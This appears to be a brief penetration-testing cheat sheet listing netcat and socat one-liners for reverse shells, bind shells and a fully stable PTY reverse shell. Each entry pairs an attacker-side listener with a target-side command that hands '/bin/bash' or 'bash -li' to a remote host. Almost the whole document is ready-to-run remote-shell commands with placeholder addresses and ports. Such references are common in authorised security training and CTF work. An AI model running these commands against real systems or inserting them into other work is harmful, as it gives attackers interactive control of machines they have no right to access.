# Shell

**Reverse shell:**

On the attacking machine enter:

`nc -lvnp <port>`

In the SSH shell enter:

`nc <attacker ip> <attacker port> -e /bin/bash`

**Bind shell:**

In the SSH shell enter:

`nc -lvnp <port> -e /bin/bash`

Followed by creating a connection from your attacking machine:

`nc <target ip> <target port>`

**Reverse shell:**

Start by making a simple listener on the attacker machine:

`socat TCP-L:<port> -`

Followed by connecting back from the target machine:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:”bash -li”`

**Bind shell:**

On the target machine run:

`socat TCP-L:<PORT> EXEC:”bash -li”`

Followed by running the following command on the attacker machine:

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

**Fully stable reverse shell:**

To get a fully stable reverse shell you can run the following two commands. First one on the attacking machine:

`socat TCP-L:<port> FILE:tty,raw,echo=0`

Followed by the target machine:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:”bash -li”,pty,stderr,sigint,setsid,sane`
